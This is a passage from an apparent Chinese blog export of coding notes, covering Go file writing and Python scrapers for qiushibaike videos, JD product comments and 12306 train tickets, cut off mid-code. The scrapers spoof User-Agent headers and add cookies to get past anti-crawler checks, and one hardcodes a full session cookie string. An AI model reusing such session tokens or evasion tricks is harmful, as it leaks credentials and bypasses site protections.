punctuation">)</span> <span class="token punctuation">{</span>    fileObj<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">OpenFile</span><span class="token punctuation">(</span><span class="token string">"./xx.txt"</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>O_APPEND<span class="token operator">|</span>os<span class="token punctuation">.</span>O_CREATE<span class="token operator">|</span>os<span class="token punctuation">.</span>O_TRUNC<span class="token punctuation">,</span> <span class="token number">0644</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"open file failed,err:%v"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//write</span>    fileObj<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span><span class="token string">"123456789\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//写入字节切片数据</span>    <span class="token comment" spellcheck="true">//writestring</span>    fileObj<span class="token punctuation">.</span><span class="token function">WriteString</span><span class="token punctuation">(</span><span class="token string">"987654321"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//直接写入字符串数据</span>    fileObj<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre></li><li><p>利用缓存<code>bufio</code></p></li><li><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">writeDemo2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    fileObj<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">OpenFile</span><span class="token punctuation">(</span><span class="token string">"./xx.txt"</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>O_APPEND<span class="token operator">|</span>os<span class="token punctuation">.</span>O_CREATE<span class="token operator">|</span>os<span class="token punctuation">.</span>O_TRUNC<span class="token punctuation">,</span> <span class="token number">0644</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"open file failed,err:%v"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token punctuation">}</span>    <span class="token keyword">defer</span> fileObj<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//创建一个写的对象</span>    wr <span class="token operator">:=</span> bufio<span class="token punctuation">.</span><span class="token function">NewWriter</span><span class="token punctuation">(</span>fileObj<span class="token punctuation">)</span>    wr<span class="token punctuation">.</span><span class="token function">WriteString</span><span class="token punctuation">(</span><span class="token string">"hello沙河\n"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//写到缓存中</span>    wr<span class="token punctuation">.</span><span class="token function">Flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">writeDemo2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre></li><li><p>利用<code>ioutil</code></p></li><li><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    str <span class="token operator">:=</span> <span class="token string">"hello 沙河"</span>    err <span class="token operator">:=</span> ioutil<span class="token punctuation">.</span><span class="token function">WriteFile</span><span class="token punctuation">(</span><span class="token string">"./xx.txt"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0666</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"write file failed, err:"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>py爬虫</title>
      <link href="/2022/03/10/py%E7%88%AC%E8%99%AB/"/>
      <url>/2022/03/10/py%E7%88%AC%E8%99%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h1><ul><li>从本质上说，就是利用程序在网上拿到对我们有用的数据</li><li>实际上爬虫就是使用编程语言所编写的程序，作用是从网络上获取有价值的数据，重要的就是速度比手动获取数据快</li><li><img src="/2022/03/10/py%E7%88%AC%E8%99%AB/image-20210925091927888.png"></li></ul><h1 id="爬取网页视频"><a href="#爬取网页视频" class="headerlink" title="爬取网页视频"></a>爬取网页视频</h1><ul><li><p>使用<code>python</code>程序替浏览器发请求，接收响应</p><ul><li><p>安装第三方软件<code>requests</code>，使用<code>pip install requests</code></p></li><li><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">'https://www.baidu.com/'</span> <span class="token comment" spellcheck="true">#请求的网址，请求的方式位get,所以使用request的get方法</span>resp<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">)</span></code></pre></li><li><p>得到一个响应码，200表示成功，418表示遭到反爬</p></li><li><p>运行上述代码会得到</p><ul><li><img src="/2022/03/10/py%E7%88%AC%E8%99%AB/image-20210925093614674.png"></li></ul></li><li><p>为防止被检测到，需要更改<code>UA</code></p></li><li><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">'https://www.baidu.com/'</span> <span class="token comment" spellcheck="true">#请求的网址，请求的方式位get,所以使用request的get方法</span>headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 Edg/93.0.961.52'</span><span class="token punctuation">}</span>resp<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#请求响应码</span><span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#请求头</span></code></pre></li><li><p>得到</p><ul><li><img src="/2022/03/10/py%E7%88%AC%E8%99%AB/image-20210925094020847.png"></li><li>可防止初级的反爬</li></ul></li></ul></li><li><p>正则表达式</p><ul><li>正则表达式(Regular Expression)是一种文本模式，包括普通字符（例如，a 到 z 之间的字母）和特殊字符（称为”元字符”）。</li><li>正则表达式使用单个字符串来描述、匹配一系列匹配某个句法规则的字符串。</li><li>——》菜鸟教程</li></ul></li><li><p>利用正则表达式提取<code>resp.text</code>中的内容</p><ul><li><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token comment" spellcheck="true">#引入正则表达式</span><span class="token keyword">import</span> timeurl<span class="token operator">=</span><span class="token string">'https://www.qiushibaike.com/video/'</span> <span class="token comment" spellcheck="true">#请求的网址，请求的方式位get,所以使用request的get方法</span>headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 Edg/93.0.961.52'</span><span class="token punctuation">}</span>resp<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#第一个参数为规则，第二个参数为查找的内容;“.”代表任意字符，“*”代表任意个</span>info <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'&lt;source src="(.*)" type=\'video/mp4\' />'</span><span class="token punctuation">,</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#info是列表</span>lst<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> item <span class="token keyword">in</span> info<span class="token punctuation">:</span>    lst<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'https:'</span><span class="token operator">+</span>item<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print(lst)</span><span class="token comment" spellcheck="true">#下载视频，一个一个发请求</span>count<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> index<span class="token punctuation">,</span>item <span class="token keyword">in</span> enumerate<span class="token punctuation">(</span>lst<span class="token punctuation">)</span><span class="token punctuation">:</span>    req<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>item<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第{0}个视频于{1}开始下载"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>index<span class="token punctuation">,</span>time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    count<span class="token operator">+=</span><span class="token number">1</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'video/'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'.mp4'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> dir<span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">#写入本地磁盘</span>        dir<span class="token punctuation">.</span>write<span class="token punctuation">(</span>req<span class="token punctuation">.</span>content<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第{0}个视频于{1}下载结束"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>index<span class="token punctuation">,</span>time<span class="token punctuation">.</span>asctime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre></li><li><p><code>text</code>和<code>context</code></p><ul><li>前者是文本，后者是二进制文件</li></ul></li></ul></li></ul><h1 id="京东数据可视化分析"><a href="#京东数据可视化分析" class="headerlink" title="京东数据可视化分析"></a>京东数据可视化分析</h1><ul><li><p>分析有效的<code>url</code>，及数据的形式</p><ul><li><p>静态数据与动态数据</p><ul><li>静态数据：服务器端已经渲染好的内容，直接发给浏览器，浏览器直接解释执行</li><li>动态数据：点击下一页，数据栏未发生变化，说明数据时后来被渲染到HTML中的</li></ul></li><li><p><code>f12</code>找到评论数据的请求，打开对应的<code>url</code>，复制信息到<code>json.cn</code>进行解析（注意去掉多的内容）</p></li></ul></li><li><p>编写<code>python</code>向服务器发送请求获取数据</p><ul><li><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> json<span class="token keyword">import</span> time<span class="token keyword">import</span> openpyxl <span class="token comment" spellcheck="true">#用于操作excel</span><span class="token comment" spellcheck="true">#获取评论</span><span class="token keyword">def</span> <span class="token function">getComment</span><span class="token punctuation">(</span>productId<span class="token punctuation">,</span>page<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#发送请求</span>   url<span class="token operator">=</span><span class="token string">'https://club.jd.com/comment/productPageComments.action?callback=fetchJSON_comment98&amp;productId={0}&amp;score=0&amp;sortType=5&amp;page={1}&amp;pageSize=10&amp;isShadowSku=0&amp;fold=1'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>productId<span class="token punctuation">,</span>page<span class="token punctuation">)</span>    headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36 Edg/93.0.961.52'</span><span class="token punctuation">}</span>    resp<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#    if url==None:</span><span class="token comment" spellcheck="true">#        print('爬取失败')</span><span class="token comment" spellcheck="true">#    else:</span><span class="token comment" spellcheck="true">#        print('爬取成功')</span>    <span class="token comment" spellcheck="true">#显示输出,去掉多余的</span>    s<span class="token operator">=</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'fetchJSON_comment98('</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>    s<span class="token operator">=</span>s<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">');'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#json解析</span>    json_data<span class="token operator">=</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>s<span class="token punctuation">)</span>    <span class="token keyword">return</span> json_data<span class="token comment" spellcheck="true">#获取最大页数</span><span class="token keyword">def</span> <span class="token function">getMaxPage</span><span class="token punctuation">(</span>productId<span class="token punctuation">)</span><span class="token punctuation">:</span>    dic_data<span class="token operator">=</span>getComment<span class="token punctuation">(</span>productId<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#向服务器发送请求，获取字典信息</span>    <span class="token keyword">return</span> dic_data<span class="token punctuation">[</span><span class="token string">'maxPage'</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#提取数据</span><span class="token keyword">def</span> <span class="token function">getInfo</span><span class="token punctuation">(</span>productId<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#max_page=getMaxPage() 不能爬取太多，否则会被封ip</span>    max_page<span class="token operator">=</span><span class="token number">1</span>    lst<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#存储提取到的数据</span>    <span class="token keyword">for</span> page <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>max_page<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        comments<span class="token operator">=</span>getComment<span class="token punctuation">(</span>productId<span class="token punctuation">,</span>page<span class="token punctuation">)</span>        commentList<span class="token operator">=</span>comments<span class="token punctuation">[</span><span class="token string">'comments'</span><span class="token punctuation">]</span>        <span class="token comment" spellcheck="true">#遍历列表，获取每条评论的内容，颜色，鞋码</span>        <span class="token keyword">for</span> item <span class="token keyword">in</span> commentList<span class="token punctuation">:</span>            content<span class="token operator">=</span>item<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span>            color<span class="token operator">=</span>item<span class="token punctuation">[</span><span class="token string">'productColor'</span><span class="token punctuation">]</span>            size<span class="token operator">=</span>item<span class="token punctuation">[</span><span class="token string">'productSize'</span><span class="token punctuation">]</span>            lst<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span>content<span class="token punctuation">,</span>color<span class="token punctuation">,</span>size<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#将每条评论信息添加到列表中</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#延迟时间，防止太快，被封ip</span>    save<span class="token punctuation">(</span>lst<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#存储到excel中</span><span class="token keyword">def</span> <span class="token function">save</span><span class="token punctuation">(</span>lst<span class="token punctuation">)</span><span class="token punctuation">:</span>    wk<span class="token operator">=</span>openpyxl<span class="token punctuation">.</span>Workbook<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#创建工作簿对象（即使一个.xlsx文件）</span>    sheet<span class="token operator">=</span>wk<span class="token punctuation">.</span>active <span class="token comment" spellcheck="true">#获取活动表</span>    <span class="token comment" spellcheck="true">#遍历列表，把数据添加到工作表中，列表中的数据在excel中是一行</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> lst<span class="token punctuation">:</span>        sheet<span class="token punctuation">.</span>append<span class="token punctuation">(</span>item<span class="token punctuation">)</span>    wk<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'销售数据.xlsx'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#测试</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    productId<span class="token operator">=</span><span class="token string">'30890079142'</span>    getInfo<span class="token punctuation">(</span>productId<span class="token punctuation">)</span></code></pre></li></ul></li><li><p>进行数据分析</p><ul><li><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#数据分析</span><span class="token comment" spellcheck="true">#分析不同码数鞋子的销量</span><span class="token keyword">import</span> openpyxl<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pitwk<span class="token operator">=</span>openpyxl<span class="token punctuation">.</span>load_workbook<span class="token punctuation">(</span><span class="token string">'销售数据.xlsx'</span><span class="token punctuation">)</span>sheet<span class="token operator">=</span>wk<span class="token punctuation">.</span>active  <span class="token comment" spellcheck="true">#获取活动sheet表</span><span class="token comment" spellcheck="true">#获取最大行数和最大列数</span>row<span class="token operator">=</span>sheet<span class="token punctuation">.</span>max_rowcol<span class="token operator">=</span>sheet<span class="token punctuation">.</span>max_column<span class="token comment" spellcheck="true">#print(row,col)</span>lst<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#用于存出鞋码</span><span class="token comment" spellcheck="true">#读取鞋码</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>row<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    size<span class="token operator">=</span>sheet<span class="token punctuation">.</span>cell<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token comment" spellcheck="true">#cell表示sheet的单元格</span>    lst<span class="token punctuation">.</span>append<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#开始统计数据，统计不同码数鞋子的销量</span><span class="token comment" spellcheck="true">#使用字典，鞋码作键，销量作值</span>dicSize<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">for</span> item <span class="token keyword">in</span> lst<span class="token punctuation">:</span>    dicSize<span class="token punctuation">[</span>item<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> item <span class="token keyword">in</span> lst<span class="token punctuation">:</span>    dicSize<span class="token punctuation">[</span>item<span class="token punctuation">]</span><span class="token operator">=</span>dicSize<span class="token punctuation">[</span>item<span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token comment" spellcheck="true">#输出数据</span><span class="token comment" spellcheck="true">#for item in dicSize:</span><span class="token comment" spellcheck="true">#    print(item,dicSize[item])</span>lst_total<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> item <span class="token keyword">in</span> dicSize<span class="token punctuation">:</span>    lst_total<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span>item<span class="token punctuation">,</span>dicSize<span class="token punctuation">[</span>item<span class="token punctuation">]</span><span class="token punctuation">,</span>dicSize<span class="token punctuation">[</span>item<span class="token punctuation">]</span><span class="token operator">/</span><span class="token number">100</span><span class="token operator">*</span><span class="token number">1.0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">for</span> item <span class="token keyword">in</span> lst_total<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#进行可视化数据统计</span>labels<span class="token operator">=</span><span class="token punctuation">[</span>item<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">for</span> item <span class="token keyword">in</span> lst_total<span class="token punctuation">]</span> <span class="token comment" spellcheck="true">#使用列表生成式</span>fraces<span class="token operator">=</span><span class="token punctuation">[</span>item<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token keyword">for</span> item <span class="token keyword">in</span> lst_total<span class="token punctuation">]</span>pit<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.family'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'SimHei'</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#适应中文</span>pit<span class="token punctuation">.</span>pie<span class="token punctuation">(</span>x<span class="token operator">=</span>fraces<span class="token punctuation">,</span>labels<span class="token operator">=</span>labels<span class="token punctuation">,</span>autopct<span class="token operator">=</span><span class="token string">'%1.1f%%'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#pit.show()</span>pit<span class="token punctuation">.</span>savefig<span class="token punctuation">(</span><span class="token string">'图.png'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#savefig要放在show前面执行，不然会显示空白</span></code></pre></li></ul></li></ul><h1 id="爬取12306车次信息"><a href="#爬取12306车次信息" class="headerlink" title="爬取12306车次信息"></a>爬取12306车次信息</h1><ul><li><p><code>chrome</code>分析网站</p><ul><li><code>elements</code>：元素<code>HTML</code>，<code>css</code>，<code>js</code></li><li><code>console</code></li><li><code>Source</code>：相当于文件夹，<code>elements</code>，<code>js</code>，<code>css</code>等</li><li><code>network</code>：所有发送的请求</li></ul></li><li><p>如何爬取数据</p><ul><li><img src="/2022/03/10/py%E7%88%AC%E8%99%AB/image-20210927091331789.png"></li><li></li></ul></li><li><p>功能封装函数提取</p></li><li><p>爬取12306车次数据</p><ul><li>爬取车次数据后发现车站名称有英文简称，在<code>js</code>栏中可以找到<code>station_name</code>进行分析</li></ul></li><li><p><code>json</code>数据解析</p></li><li><p>正则表达式提取数据</p><ul><li><code>[\u4e00-\u9fa5]</code>代表全部的汉字</li></ul></li><li><p>数据展示</p></li><li><p>完整代码</p><ul><li><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token comment" spellcheck="true">#代替浏览器发送请求</span><span class="token keyword">def</span> <span class="token function">sendRequset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url<span class="token operator">=</span><span class="token string">'https://kyfw.12306.cn/otn/leftTicket/queryY?leftTicketDTO.train_date=2021-09-27&amp;leftTicketDTO.from_station=BJP&amp;leftTicketDTO.to_station=TJP&amp;purpose_codes=ADULT'</span>    headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 Edg/94.0.992.31'</span><span class="token punctuation">,</span><span class="token string">'Cookie'</span><span class="token punctuation">:</span><span class="token string">'_uab_collina=163270470989732643680974; JSESSIONID=3B9AFBC05E0BD1CD80AF6BC2C261E466; BIGipServerotn=3990290698.50210.0000; BIGipServerpassport=803733770.50215.0000; guidesStatus=off; highContrastMode=defaltMode; cursorStatus=off; RAIL_EXPIRATION=1633025496474; RAIL_DEVICEID=r-BfdT9ZoSUFu8mDnx4vo8tqNI_FJsOg_yhnqUn4X8my8cVtiZS9YdNYxKHeftzfftX-chAnhrrTxEkcbpG5DpiXJ0U4s-Rcyz5-LYa9cQZUGZLQ4H97ygypQeuIMbEXk9CYRijmQRQBzFi90NDhwsXfWvTbT43k; route=9036359bb8a8a461c164a04f8f50b252; _jc_save_fromStation=%u5317%u4EAC%2CBJP; _jc_save_toStation=%u5929%u6D25%2CTJP; _jc_save_fromDate=2021-09-27; _jc_save_toDate=2021-09-27; _jc_save_wfdc_flag=dc; BIGipServerportal=3168010506.17695.0000'</span><span class="token punctuation">}</span>    resp<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#加headers的UA后仍然被反爬，再加cookie后得到正确数据，如果还不行则继续加headers</span>    <span class="token comment" spellcheck="true">#设置编码格式,在网站element栏搜索charset找出编码格式</span>    resp<span class="token punctuation">.</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span>        <span class="token comment" spellcheck="true">#print(resp.text)</span>    <span class="token keyword">return</span> resp<span class="token comment" spellcheck="true">#提取车次信息具体数据</span><span class="token keyword">def</span> <span class="token function">parseJson</span><span class="token punctuation">(</span>resp<span class="token punctuation">,</span>stationName<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#将响应结果转为json</span>    jsonTicket<span class="token operator">=</span>resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>    lstTicket<span class="token operator">=</span>jsonTicket<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'result'</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#提取车次列表</span>    <span class="token comment" spellcheck="true">#遍历每个车次信息，以“|”为分隔符分割</span>    <span class="token comment" spellcheck="true">#[3]表示车次，[6]查询起始站，[7]查询到达站，[31]一等座，[30]表示二等座，[13]表示出行时间</span>    lst<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#存储上述信息</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> lstTicket<span class="token punctuation">:</span>        d<span class="token operator">=</span>item<span class="token punctuation">.</span>split<span class="token punctuation">(</span>sep<span class="token operator">=</span><span class="token string">'|'</span><span class="token punctuation">)</span>        lst<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span>d<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>stationName<span class="token punctuation">[</span>d<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span>stationName<span class="token punctuation">[</span>d<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span>d<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">,</span>d<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">,</span>d<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> lst<span class="token comment" spellcheck="true">#获取车站名称信息，即’车站名‘和’车站名简称‘的对应表</span><span class="token keyword">def</span> <span class="token function">getStation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">'https://kyfw.12306.cn/otn/resources/js/framework/station_name.js?station_version=1.9204'</span>    headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36 Edg/94.0.992.31'</span><span class="token punctuation">}</span>    resp<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    resp<span class="token punctuation">.</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span>        <span class="token comment" spellcheck="true">#print(resp.text)</span>    <span class="token comment" spellcheck="true">#获取指定格式的字串</span>    stationList<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'([\u4e00-\u9fa5]+)\|([A-Z]+)'</span><span class="token 